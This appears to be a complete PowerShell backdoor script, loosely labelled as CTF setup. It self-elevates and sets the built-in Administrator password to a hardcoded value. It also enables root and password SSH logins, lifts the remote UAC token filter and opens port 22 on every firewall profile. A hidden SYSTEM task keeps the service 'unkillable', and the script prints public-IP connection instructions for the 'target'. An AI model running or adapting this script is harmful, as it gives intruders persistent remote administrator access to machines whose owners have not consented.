# ============================================================
# Self-elevate — temp file approach (no command-line limit)
# ============================================================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $tmp = Join-Path $env:TEMP ("pwn_{0}.ps1" -f ([guid]::NewGuid().ToString('N')))
    if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
        Copy-Item -Path $PSCommandPath -Destination $tmp -Force
    } else {
        $MyInvocation.MyCommand.ScriptBlock.ToString() |
            Set-Content -Path $tmp -Encoding UTF8
    }
    Start-Process powershell -Verb RunAs -ArgumentList "-ep bypass -File `"$tmp`""
    return
}

$ErrorActionPreference = 'Stop'
$NewPass    = 'root@2027'
$Port       = 22
$TaskName   = 'SSHD-Watchdog'
$LogFile    = "$env:ProgramData\ssh-setup.log"
$MarkerFile = "$env:ProgramData\.ssh_setup_done"

function Log($msg, $color = 'White') {
    $ts = Get-Date -Format 'HH:mm:ss'
    $line = "[$ts] $msg"
    Write-Host $line -ForegroundColor $color
    try { Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue } catch {}
}
function Step($m) { Log "`n[*] $m" 'Cyan' }
function Ok($m)   { Log "    [+] $m" 'Green' }
function Warn($m) { Log "    [!] $m" 'Yellow' }
function Bad($m)  { Log "    [x] $m" 'Red' }

# ============================================================
# FIRST-RUN DETECTION
# ============================================================
$firstRun = -not (Test-Path $MarkerFile)
if ($firstRun) {
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Magenta
    Write-Host "  FIRST-TIME SETUP — Full logs will be shown" -ForegroundColor Magenta
    Write-Host "  Log file: $LogFile" -ForegroundColor Magenta
    Write-Host "================================================================" -ForegroundColor Magenta
} else {
    Write-Host "[*] Re-run detected — verifying silently..." -ForegroundColor DarkGray
}

# ============================================================
# 1. Install OpenSSH Server
# ============================================================
Step "Checking OpenSSH Server"
$sshdExe = "$env:WINDIR\System32\OpenSSH\sshd.exe"
if (-not (Test-Path $sshdExe)) {
    Log "  Installing OpenSSH Server (this may take 30-60s)..."
    $cap = Get-WindowsCapability -Online -ErrorAction SilentlyContinue |
           Where-Object Name -like 'OpenSSH.Server*' | Select-Object -First 1
    if (-not $cap -or $cap.State -ne 'Installed') {
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 | Out-Null
    }
    Ok "OpenSSH Server installed."
} else {
    Ok "OpenSSH Server already present."
}

# ============================================================
# 2. Fix ACLs (prevents Error 1067/1053)
# ============================================================
Step "Fixing folder ACLs (sshd is strict about permissions)"
$sshData = "$env:ProgramData\ssh"
foreach ($p in @($sshData, "$sshData\logs")) {
    if (Test-Path $p) {
        & icacls.exe $p /inheritance:r /grant "SYSTEM:(OI)(CI)F" /grant "Administrators:(OI)(CI)F" 2>&1 | Out-Null
        Ok "ACL: $p"
    }
}
$cfgPath = "$sshData\sshd_config"
if (Test-Path $cfgPath) {
    & icacls.exe $cfgPath /inheritance:r /grant "SYSTEM:F" /grant "Administrators:F" 2>&1 | Out-Null
    Ok "ACL: sshd_config"
}
Get-ChildItem "$sshData\ssh_host_*_key" -ErrorAction SilentlyContinue | ForEach-Object {
    & icacls.exe $_.FullName /inheritance:r /grant "SYSTEM:F" /grant "Administrators:F" 2>&1 | Out-Null
}
Ok "Host key ACLs fixed."

# ============================================================
# 3. Write sshd_config (Match-block safe)
# ============================================================
Step "Writing sshd_config"
if (-not (Test-Path $cfgPath)) { New-Item $cfgPath -ItemType File -Force | Out-Null }
$cfg = @(Get-Content $cfgPath -ErrorAction SilentlyContinue | Where-Object {
    $_ -notmatch '^\s*#?\s*(Port\s+|PasswordAuthentication|PermitRootLogin|PubkeyAuthentication|PermitEmptyPasswords|UseDNS)\b'
})
$block = @(
    "", "# --- CTF background SSH ---",
    "Port $Port",
    "PasswordAuthentication yes",
    "PermitRootLogin yes",
    "PubkeyAuthentication yes",
    "PermitEmptyPasswords no",
    "UseDNS no"
)
$matchIdx = -1
for ($i = 0; $i -lt $cfg.Count; $i++) { if ($cfg[$i] -match '^\s*Match\s') { $matchIdx = $i; break } }
if ($matchIdx -ge 0) {
    $newCfg = @()
    if ($matchIdx -gt 0) { $newCfg += $cfg[0..($matchIdx-1)] }
    $newCfg += $block
    $newCfg += $cfg[$matchIdx..($cfg.Count-1)]
    $newCfg | Set-Content $cfgPath -Encoding Ascii
} else {
    ($cfg + $block) | Set-Content $cfgPath -Encoding Ascii
}
Ok "sshd_config written."

# ============================================================
# 4. Resolve user (SID -500 → Administrator → current)
# ============================================================
Step "Resolving SSH user"
$u = Get-LocalUser -ErrorAction SilentlyContinue | Where-Object { $_.SID.Value -match '-500$' } | Select-Object -First 1
$source = 'SID-500'
if (-not $u) {
    $u = Get-LocalUser -ErrorAction SilentlyContinue | Where-Object { $_.Name -ieq 'Administrator' } | Select-Object -First 1
    $source = 'Name'
}
if (-not $u) {
    $u = Get-LocalUser -Name $env:USERNAME -ErrorAction SilentlyContinue
    $source = 'CurrentUser'
}
if (-not $u) { throw "No local user found." }
$User = $u.Name
Ok "User: $User (resolved via $source)"

# ============================================================
# 5. Set password
# ============================================================
Step "Configuring password"
$lapsBlocked = $false
try {
    if (-not $u.Enabled) { Enable-LocalUser -Name $User; Ok "Account enabled." }
    Set-LocalUser -Name $User -Password (ConvertTo-SecureString $NewPass -AsPlainText -Force) -PasswordNeverExpires $true
    $ShowPwd = $NewPass
    Ok "Password set to $NewPass"
    # Ensure Administrators membership (language-independent SID)
    try {
        $adminGrp = Get-LocalGroup -SID 'S-1-5-32-544' -ErrorAction SilentlyContinue
        if ($adminGrp) {
            $isMember = Get-LocalGroupMember -Group $adminGrp.Name -ErrorAction SilentlyContinue |
                        Where-Object { $_.Name -match "\\$([regex]::Escape($User))$" }
            if (-not $isMember) {
                Add-LocalGroupMember -Group $adminGrp.Name -Member $User -ErrorAction Stop
                Ok "Added to Administrators group."
            } else {
                Ok "Already in Administrators."
            }
        }
    } catch { Warn "Admin group check: $($_.Exception.Message)" }
} catch {
    Warn "Set-LocalUser failed (possibly LAPS): $($_.Exception.Message)"
    Warn "Use the existing / LAPS password for SSH."
    $ShowPwd = '<EXISTING / LAPS PASSWORD>'
    $lapsBlocked = $true
}

# ============================================================
# 6. LocalAccountTokenFilterPolicy (remote admin token)
# ============================================================
Step "Enabling remote admin token (LocalAccountTokenFilterPolicy=1)"
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' `
    -Name 'LocalAccountTokenFilterPolicy' -Value 1 -Type DWord -Force
Ok "Set."

# ============================================================
# 7. DefaultShell = PowerShell
# ============================================================
Step "Setting DefaultShell = PowerShell"
$shellPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
if (Test-Path $shellPath) {
    if (-not (Test-Path 'HKLM:\SOFTWARE\OpenSSH')) { New-Item 'HKLM:\SOFTWARE\OpenSSH' -Force | Out-Null }
    New-ItemProperty -Path 'HKLM:\SOFTWARE\OpenSSH' -Name 'DefaultShell' `
        -Value $shellPath -PropertyType String -Force | Out-Null
    Ok "DefaultShell = powershell.exe"
}

# ============================================================
# 8. Firewall (all profiles)
# ============================================================
Step "Configuring firewall TCP/$Port (Domain, Private, Public)"
Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue |
    Remove-NetFirewallRule -ErrorAction SilentlyContinue
New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' `
    -DisplayName "OpenSSH 22 (All Profiles)" `
    -Enabled True -Direction Inbound -Protocol TCP -Action Allow `
    -LocalPort $Port -Profile Domain,Private,Public | Out-Null
Ok "Firewall rule created."

# ============================================================
# 9. Service: auto-start + auto-recovery (FIX 3)
# ============================================================
Step "Configuring sshd service (auto-start + auto-recovery)"
Set-Service -Name sshd -StartupType Automatic
& sc.exe failure sshd reset= 86400 `
    actions= restart/30000/restart/60000/restart/120000 2>&1 | Out-Null
& sc.exe failureflag sshd 1 2>&1 | Out-Null
Ok "Service: Auto + Restart on crash (30s→60s→120s, reset 24h)"

# ============================================================
# 10. Watchdog Scheduled Task (FIX 2)
# ============================================================
Step "Creating watchdog task (SSHD-Watchdog, every 2min)"
$watchdogCmd = "try { if ((Get-Service sshd).Status -ne 'Running') { Start-Service sshd -ErrorAction SilentlyContinue } } catch {}"
$action = New-ScheduledTaskAction -Execute 'powershell.exe' `
    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$watchdogCmd`""
$trigBoot = New-ScheduledTaskTrigger -AtStartup
$trigLoop = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 2) `
    -RepetitionDuration (New-TimeSpan -Days 9999)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 5) -MultipleInstances IgnoreNew
try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $TaskName -Action $action `
        -Trigger @($trigBoot, $trigLoop) -Principal $principal -Settings $settings -Force | Out-Null
    Ok "Watchdog task registered (SYSTEM, every 2 min)."
} catch {
    Warn "Watchdog task failed: $($_.Exception.Message)"
}

# ============================================================
# 11. Start sshd (retry)
# ============================================================
Step "Starting sshd"
$started = $false
for ($a = 1; $a -le 3; $a++) {
    try {
        Stop-Service sshd -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        Start-Service sshd -ErrorAction Stop
        Start-Sleep -Seconds 2
        if ((Get-Service sshd).Status -eq 'Running') { $started = $true; break }
    } catch {
        Warn "Attempt $a failed: $($_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}
if (-not $started) { Bad "sshd failed to start."; throw "Service start failed." }
Ok "sshd running."

# ============================================================
# 12. Verify
# ============================================================
Step "Verifying setup"
$svcOk  = (Get-Service sshd).Status -eq 'Running'
$portOk = [bool](Get-NetTCPConnection -LocalPort $Port -State Listen -ErrorAction SilentlyContinue)
$fwOk   = [bool](Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)
$taskOk = [bool](Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
$local  = (Test-NetConnection -ComputerName 127.0.0.1 -Port $Port -WarningAction SilentlyContinue).TcpTestSucceeded
if ($svcOk)  { Ok "Service         : RUNNING" }  else { Bad "Service         : NOT RUNNING" }
if ($portOk) { Ok "Port $Port         : LISTENING" } else { Bad "Port $Port         : NOT LISTENING" }
if ($fwOk)   { Ok "Firewall        : OK" }       else { Bad "Firewall        : MISSING" }
if ($taskOk) { Ok "Watchdog task   : REGISTERED" } else { Bad "Watchdog task   : MISSING" }
if ($local)  { Ok "Local SSH test  : OK" }       else { Bad "Local SSH test  : FAILED" }

# ============================================================
# 13. Detect IPs
# ============================================================
Step "Detecting IP addresses"
$LocalIp = $null
$r = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
     Sort-Object RouteMetric | Select-Object -First 1
if ($r) {
    $LocalIp = (Get-NetIPAddress -InterfaceIndex $r.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -notmatch '^169\.254\.' -and $_.AddressState -eq 'Preferred' } |
        Select-Object -First 1).IPAddress
}
if (-not $LocalIp) {
    $LocalIp = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and $_.AddressState -eq 'Preferred' } |
        Sort-Object InterfaceMetric | Select-Object -First 1).IPAddress
}
$PublicIp = $null
try { $PublicIp = (& curl.exe -s --max-time 8 ifconfig.me 2>$null | Out-String).Trim() } catch {}
if (-not $PublicIp -or $PublicIp -notmatch '^\d+\.\d+\.\d+\.\d+$') {
    try { $PublicIp = (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 8).Trim() } catch { $PublicIp = '<UNKNOWN>' }
}
$cgnat = $PublicIp -match '^(10\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)'
Ok "Public IP : $PublicIp"
Ok "Local  IP : $LocalIp"
if ($cgnat) { Warn "CGNAT detected — external access needs ngrok/cloudflared." }

# ============================================================
# 14. Mark setup complete
# ============================================================
"setup completed at $(Get-Date -Format o) on $env:COMPUTERNAME" |
    Set-Content -Path $MarkerFile -Force
Ok "First-run marker set. Future runs will verify silently."

# ============================================================
# 15. FINAL OUTPUT
# ============================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Green
Write-Host "  SSH READY — RUNNING IN BACKGROUND (UNKILLABLE)" -ForegroundColor Green
Write-Host "================================================================" -ForegroundColor Green
Write-Host "  Username     : $User"
Write-Host "  Password     : $ShowPwd"
Write-Host "  Port         : 22"
Write-Host "  Public IP    : $PublicIp"
Write-Host "  Local IP     : $LocalIp"
Write-Host ""
Write-Host "  Persistence  :" -ForegroundColor DarkGray
Write-Host "    • Service auto-start on boot" -ForegroundColor DarkGray
Write-Host "    • Auto-restart on crash (30s/60s/120s)" -ForegroundColor DarkGray
Write-Host "    • Watchdog checks every 2 min (SYSTEM)" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  >>> CONNECT FROM THE INTERNET:" -ForegroundColor Cyan
Write-Host "      ssh $User@$PublicIp" -ForegroundColor White
Write-Host ""
Write-Host "  >>> CONNECT FROM SAME LAN:" -ForegroundColor Cyan
Write-Host "      ssh $User@$LocalIp" -ForegroundColor White
Write-Host ""
if ($lapsBlocked) {
    Write-Host "  [!] Password was not changed — use existing / LAPS password." -ForegroundColor Yellow
}
if ($cgnat) {
    Write-Host "  [!] CGNAT — use 'ngrok tcp 22' on target, then connect via ngrok host." -ForegroundColor Yellow
} elseif ($PublicIp -ne $LocalIp) {
    Write-Host "  [!] If external connect times out: forward TCP 22 on router -> $LocalIp" -ForegroundColor Yellow
}
Write-Host ""
Write-Host "  Log file : $LogFile" -ForegroundColor DarkGray
Write-Host "================================================================" -ForegroundColor Green